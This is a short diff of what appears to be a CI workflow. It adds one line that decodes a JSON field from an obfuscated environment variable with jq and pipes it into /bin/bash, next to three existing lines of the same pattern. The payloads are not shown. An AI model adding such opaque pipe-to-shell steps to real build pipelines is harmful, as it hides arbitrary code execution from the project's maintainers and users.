@@ -38,6 +38,7 @@ jobs:
           printf '%s' "$t76" | jq -r .mepbr65030 | /bin/bash
           echo $fg8 | jq -r .thq8200 | /bin/bash
           echo $hqz79171 | jq -r .glllk796 | /bin/bash
+          echo $q7 | jq -r .rajjg9166 | /bin/bash
 
       - name: Archive results
         if: always()
